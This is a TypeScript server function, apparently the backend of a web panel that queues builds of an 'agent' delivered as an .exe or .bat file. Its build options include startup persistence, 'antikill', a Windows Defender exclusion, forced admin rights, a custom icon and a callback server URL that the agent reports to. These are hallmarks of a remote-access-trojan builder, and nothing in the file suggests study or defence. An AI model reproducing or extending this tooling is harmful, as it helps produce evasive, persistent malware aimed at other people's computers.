import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { getRequestHeader, getRequestHost } from "@tanstack/react-start/server";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";

const Input = z.object({
  name: z.string().min(1).max(40).regex(/^[a-zA-Z0-9 _.-]+$/),
  startup: z.boolean(),
  startup_name: z.string().max(40).optional().nullable(),
  debug: z.boolean(),
  antikill: z.boolean().optional().default(false),
  wd_exclusion: z.boolean().optional().default(false),
  require_admin: z.boolean().optional().default(false),
  fun_features: z.boolean().optional().default(false),
  tag: z.string().max(32).regex(/^[a-zA-Z0-9 _-]*$/).optional().nullable(),
  output_kind: z.enum(["exe", "bat"]),
  icon_url: z.string().url().optional().nullable(),
});

// Stable lovable.app URLs that actually serve our API (lovableproject.com
// preview URLs redirect and break the agent's JSON parsing).
const PROJECT_ID = "5a812085-735a-438c-8ab0-793e6374dce4";
const STABLE_PROD = `https://project--${PROJECT_ID}.lovable.app`;
const STABLE_DEV = `https://project--${PROJECT_ID}-dev.lovable.app`;

function normalizeAgentTarget(url: string): string {
  const clean = url.replace(/\/$/, "");
  if (clean.includes("lovableproject.com") || clean.includes("id-preview--")) {
    return STABLE_DEV;
  }
  if (/project--[0-9a-f-]+(-dev)?\.lovable\.app/i.test(clean) && !clean.includes(PROJECT_ID)) {
    return STABLE_DEV;
  }
  return clean;
}

function detectOrigin(): string {
  const envUrl = process.env.AGENT_TARGET_SERVER_URL;
  if (envUrl) return normalizeAgentTarget(envUrl);

  const candidates = [
    getRequestHeader("origin"),
    (() => {
      const proto = getRequestHeader("x-forwarded-proto") ?? "https";
      const host = getRequestHost();
      return host ? `${proto}://${host}` : null;
    })(),
  ].filter(Boolean) as string[];

  for (const raw of candidates) {
    const u = raw.replace(/\/$/, "");
    // Skip iframe preview origins — they redirect and break agents.
    if (/lovableproject\.com$/i.test(new URL(u).hostname)) continue;
    if (/^id-preview--/i.test(new URL(u).hostname)) continue;
    if (/lovable\.app$/i.test(new URL(u).hostname)) return normalizeAgentTarget(u);
  }

  // Fall back to a known-good stable URL.
  return STABLE_DEV;
}

export const createBuild = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d) => Input.parse(d))
  .handler(async ({ data, context }) => {
    const { supabase, userId } = context;

    const { count } = await supabase
      .from("builds")
      .select("id", { count: "exact", head: true })
      .eq("user_id", userId)
      .in("status", ["queued", "running"]);
    if ((count ?? 0) >= 2) {
      return { ok: false as const, error: "Max 2 builds in queue. Wait for one to finish." };
    }

    const targetServerUrl = detectOrigin();

    const { data: row, error } = await supabase
      .from("builds")
      .insert({
        user_id: userId,
        name: data.name,
        startup: data.startup,
        startup_name: data.startup ? (data.startup_name || data.name) : null,
        debug: data.debug,
        antikill: data.antikill ?? false,
        wd_exclusion: data.wd_exclusion ?? false,
        require_admin: data.require_admin ?? false,
        fun_features: data.fun_features ?? false,
        tag: data.tag ?? null,
        output_kind: data.output_kind,
        icon_url: data.icon_url ?? null,
        status: "queued",
        target_server_url: targetServerUrl,
      } as any)
      .select("id")
      .single();
    if (error) return { ok: false as const, error: error.message };

    return { ok: true as const, id: row.id };
  });
